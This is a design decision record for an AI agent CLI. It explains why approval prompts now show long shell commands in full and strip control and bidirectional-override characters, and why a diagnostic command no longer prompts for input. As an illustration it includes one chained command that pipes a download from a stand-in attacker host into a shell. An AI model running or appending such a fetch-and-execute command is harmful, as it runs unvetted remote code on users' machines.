---
status: accepted
date: 2026-09-13
---

# an approval prompt shows the whole command, and a report asks nothing

**Decision:** `approval.rs` no longer truncates a `run_command` command into
the prompt line. Past `COMMAND_MAX_BYTES` the command is printed in full
above the question and the line below points at it. Separately,
`resolve_host_and_model` only offers its Ollama model picker when the caller
asked for it and stdin is a terminal, and `doctor` asks for it not at all.

**The truncation was the defect, not the length.** `cap_summary` cut a
command at 120 bytes and appended an ellipsis, so a person could be asked to
approve a command whose end they could not see. The end of a shell command
is exactly where a second one goes: `make build ...` and
`make build ... && curl evil.example.com/x | sh` were the same prompt once
the first 120 bytes matched. Found in a CLI regression pass, and it had a
test pinning it, which is how the wrong behaviour lasted.

Control characters are still replaced with spaces in the block, because a
command carrying a carriage return could redraw the line it was printed on
and show something other than what would run. That is a substitution, not a
cut: the byte count is printed beside it and nothing is hidden.

Bidirectional overrides go the same way, and they are the reason the rule
could not stay at `char::is_control`. U+202E and the rest of that range are
Format rather than Control, so `is_control` is false for them and they used
to travel straight through onto the line. One of them reverses everything
drawn after it, which is the same defect the truncation was, reached by a
different route: what the person reads is not what the shell runs.
`title::is_invisible` is already the list of those characters in this crate,
so `approval.rs` reuses it rather than keeping a second copy to drift.

Only `run_command` gets a block. `write_file` and `apply_patch` report a
byte count rather than contents on purpose, and printing a file body above
an approval prompt would be a regression in the other direction.

**A report asks nothing.** The model picker fired from every caller of
`resolve_host_and_model`, including `doctor`, whose whole job is to say what
is configured. On a machine with no model set, `zorp-agent doctor` printed a
numbered list and `Select a model (1-1):` into the middle of its own report,
and did it with stdin closed, so a scripted run blocked on a question with
nothing there to answer it. The picker now needs a caller that wants it and
a terminal to ask into; `doctor` goes through
`resolve_host_and_model_quietly` and reports "no model set", which is what
it always meant to say.
